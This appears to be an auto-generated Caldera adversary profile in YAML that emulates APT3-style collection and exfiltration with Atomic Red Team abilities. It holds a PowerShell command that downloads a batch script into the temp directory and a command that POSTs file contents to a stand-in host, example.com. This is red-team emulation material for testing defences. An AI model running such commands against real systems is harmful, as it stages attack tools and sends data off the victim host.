adversary_id: custom_adversary_profile__APT_3__APT3_Phase3_Pattern_2__2023-10-19-22_37_42
name: Custom Adversary Profile
description: [['stockpile__collection', 'atomic__collection'], ['stockpile__exfiltration', 'atomic__exfiltration']]
atomic_ordering:
- e6dfc7e89359ac6fa6de84b0e1d5762e # ('e6dfc7e89359ac6fa6de84b0e1d5762e', 'None', 'validate_me') ; {'description': 'Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n', 'tactic': 'collection', 'technique': {'attack_id': 'T1074.001', 'name': 'Data Staged: Local Data Staging'}, 'platforms': {'windows': {'psh': {'cleanup': 'Remove-Item -Force $env:TEMP\\discovery.bat -ErrorAction Ignore', 'command': 'Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile $env:TEMP\\discovery.bat', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['e6dfc7e89359ac6fa6de84b0e1d5762e', 'None', 'validate_me'], 'plugin': 'atomic'}
- ac4d31cae06889fe70ed9464748c970a # ('ac4d31cae06889fe70ed9464748c970a', 'None', 'validate_me') ; {'description': 'Exfiltrates a file present on the victim machine to the C2 server.\n', 'tactic': 'exfiltration', 'technique': {'attack_id': 'T1041', 'name': 'Exfiltration Over C2 Channel'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': 'if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ ;   1..100 | ForEach-Object { Add-Content -Path $env:TEMP\\LineNumbers.txt -Value "This is line $_." }; }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent = Get-Content -Path $env:TEMP\\LineNumbers.txt; Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['ac4d31cae06889fe70ed9464748c970a', 'None', 'validate_me'], 'plugin': 'atomic'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []